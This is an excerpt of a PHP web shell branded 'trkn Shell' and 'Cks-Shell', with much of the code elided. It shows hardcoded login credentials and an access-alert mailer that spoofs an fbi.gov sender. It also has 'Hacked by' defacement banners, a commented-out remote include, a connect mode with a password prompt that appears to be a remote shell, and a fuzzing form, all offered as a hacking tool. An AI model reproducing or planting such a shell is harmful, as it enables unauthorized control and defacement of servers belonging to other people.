...
[]----------------------------------------
[]========================================
[]>trhacknon anonymous red hat hacker<<<<<
[]========================================
[]+  Telegram: https://t.me/trkn         +
[]+  trhacknon anonymous red hat         +
[]========================================
[]
[]
[]
...
$greeting 		= "Welcome in trhacknon Shell";
$user 			= "trhacknon";
$pass 			= "trhacknon";
...
function sendLoginAlert()
{
    ...
    $from = "trkn-shell$randomInt@fbi.gov"; 
    
    //echo $from;
    
    if(function_exists('mail'))
    {
        $subject = "Shell Accessed -- trkn-Shell --";
        $message = "
Hey Owner ,
        
        Your Shell(trkn-Shell) located at $url was accessed by $accesedIp
...
<table>
    <tbody>
        <tr>
            <td width="500px">
        <pre>
<center><a href=><img src=https://b.top4top.io/p_2280mvkvg0.jpg height=200 width=200 alt="Hacked by trhacknon" /></a><br>
<font color="#198944">
<b>
[]========================================
[]--------------trkn Shell----------------
...
[]========================================
[]>>>>>>>>> trhacknon anonymous <<<<<<<<<<
[]========================================</font><font color="#0f9a54">
[]>>anonymous red hat hacker <<<<<<<<<<<<+
...
[]========================================</font><font color="grey">
            ...
            <td>
                   <?php
                   // <div id="wassup">
                   //      include("http://Cks-shell.sourceforge.net/wassup.txt");
                   //</div>
                   ?>
...
<table class="top">
    <tbody>
        <tr>
            <td width="30px;">
            <div class="logo">
                <img src=https://d.top4top.io/p_2083t7q8d0.gif height=100 width=100 alt="Hacked by CKS" />
            </div>
            </td>
            <td>
            <div class="header">
        ...
        <tr>
            <form method='GET'>
                ...
                <tr>
                    ...
                    <td>
                         <input class="cmd" name="title" value="Cks-Shell"/>
                    </td>
                </tr>
                <tr>
                <td class="title">
                ...
                <td>
                    <input class="cmd" name="text" value="Rh077king" />
                </td>
                </tr>
                <tr>
                    <td width="100" class="title">
                    ...
                    <td>
                         <input class="cmd" name="url" value="Cks-Shell.php"/>
                    </td>
                </tr>
                <tr>
                    <td width="100" class="title">
...
else if(isset($_GET['connect']))
{
    ...
    else if($_POST['mode'] == "PHP")
    {
        ...
        $passwordPrompt = "\n=================================================================\nCks-Shell | C0d3d by Rh077king | Bangladesh\n=================================================================\n\n0xPassword : ";
        ...
        <form method='POST' >  
         ...
         <td>
            <table style="border-spacing: 6px;">
                ...
                <tr>
                    <td>Passwd </td>
                    <td><input style="width: 100px;" class="cmd" name="passwd" size='5' value="Rh077king"/>
                </tr>
                <tr>
                <td>
                Mode
...
else if(isset($_GET['fuzz']))
{
    ...
    )
    {
	   ...
	   for($i=0;$i<$times;$i++)
	   {
        ...
        echo "<script>alert('Fuzzing Completed!By trkn');</script>";
        ...
        <form method="GET">
            ...
            <table id="margins">
                ...
                <tr>
                    ...
                    <td>
                        <input class="cmd" name="message" value="%S%x--Rh077king is Here --%x%S" onfocus="if(this.value == '%S%x--Rh077king is Here --%x%S')this.value = '';" onblur="if(this.value=='')this.value='%S%x--Rh077king is Here --%x%S';"/>
                    </td>
                    <td>
                        x
                    </td>
    ...
    else
    {
        ...
        <form method="GET">
            ...
            <table id="margins">
                ...
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">Cks-Shell Rocks!!</textarea>
                    </td>
                </tr>
...
<div class="end" id='footer' style="margin-top: 10px;">
<p align="center"><b>Copyright[All rights reserved]</b><br />
(: <a href="http://tndevsec.cf">Follow Team</a> | <a href="https://www.facebook.com">Facebook</a> :)<br>
<font face="courier new" color="#ed68fd" size="7">(Greetz To)</font><br> <font face="courier new" color="#00ff1f"size="6">trhacknon , and all trhacknon friends! We'll Always rock <br>trhacknon anonymous red hat hacker</font>
</p>
</div>
